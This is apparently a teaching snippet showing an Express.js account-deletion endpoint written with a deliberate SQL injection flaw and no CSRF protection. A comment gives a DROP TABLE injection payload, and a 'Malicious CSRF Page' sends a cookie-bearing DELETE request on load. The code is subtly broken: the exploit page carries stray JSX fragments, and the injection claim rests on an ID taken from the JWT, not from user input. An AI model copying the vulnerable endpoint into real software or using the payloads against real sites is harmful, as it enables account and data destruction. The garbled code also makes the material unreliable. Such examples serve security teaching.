/* -----------------------------------------------------------------------------
CSRF Vulnerability:
- The /delete-account endpoint allows users to delete their account without any CSRF protection.
- An attacker can exploit this by tricking an authenticated user into visiting a malicious website that makes a request to this endpoint.

SQL Injection Vulnerability:
- The endpoint constructs the SQL query using string concatenation.
- An attacker can inject malicious SQL code like `'; DROP TABLE users;--` to delete the entire users table.
-----------------------------------------------------------------------------*/
app.delete("/delete-account", authMiddleware, (req, res) => {
  // 1. Authenticate User via JWT in Cookie
  const user = req.user;
  if (!user) return res.status(401).json({ message: "Unauthorized" });
  const userId = user.id;

  // 2. Delete User Account
  const sqlQuery = `DELETE FROM users WHERE id = '${userId}'`;
  db.query(sqlQuery, () => {
    return res.status(200).json({ message: "Account deleted successfully" });
  });
});

/* -----------------------------------------------------------------------------
CSRF Exploit Example - Malicious Webpage:
- An attacker can create a malicious webpage that automatically sends a DELETE request
- to the /delete-account endpoint when visited by an authenticated user.
-----------------------------------------------------------------------------*/
<html>
  <head>
    <title>Malicious CSRF Page</title>
    <script>
      window.onload = function(){" "}
      {fetch("http://vulnerable-app/delete-account", {
        method: "DELETE",
        credentials: "include", // Include cookies for authentication
      })}
    </script>
  </head>
  <body>
    <h1>Welcome to my malicious page!</h1>
    <p>
      If you are logged into the vulnerable app, your account will be deleted.
    </p>
  </body>
</html>;
